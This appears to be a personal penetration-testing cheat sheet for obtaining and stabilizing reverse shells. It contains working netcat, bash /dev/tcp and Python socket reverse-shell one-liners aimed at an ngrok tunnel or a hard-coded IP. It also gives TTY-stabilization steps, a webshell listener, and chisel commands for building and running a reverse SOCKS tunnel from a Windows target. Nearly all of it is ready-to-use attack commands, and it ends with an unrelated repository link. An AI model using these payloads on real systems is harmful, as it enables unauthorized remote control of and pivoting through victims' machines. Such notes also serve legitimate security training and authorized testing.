# Multiple choices
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

# ngrok as a proxy
```bash
# On attacker (term1)
ngrok tcp 12345

# On attacker (term2)
nc -lvp 12345

# On target, use your reverse shell payload on the ngrok tunnel target
nc NGROK_PUBLIC_IP NGROK_PORT -e /bin/sh
bash -c "bash -i >& /dev/tcp/NGROK_PUBLIC_IP/NGROK_PORT 0>&1"
```

# Using python
## Create shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.33.78",33456));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

## Stabilize shell (can go up, get history, ...)
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl-z
stty raw -echo ; fg
export TERM=xterm

# Web servers on Unix
See /usr/share/webshell to have ready to use webshells, update MY_IP and LISTENING_PORT
```bash
nc -lvnp LISTENING_PORT
```

# Connected on windows (well, maybe not)
https://github.com/jpillora/chisel

```bash
Create binaries
go mod vendor
go build -ldflags "-s -w" # build Linux binary:
env GOOS=windows GOARCH=amd64 go build -o chisel-x64.exe -ldflags "-s -w" # build Windows binary
```

```bash
# Listening
/opt/chisel/chisel server -p LISTENING_PORT --reverse
```

```sh
# Powershell command
chisel-x64.exe client MY_IP:LISTENING_PORT R:socks
```

http://github.com/certat/intelmq-docker.git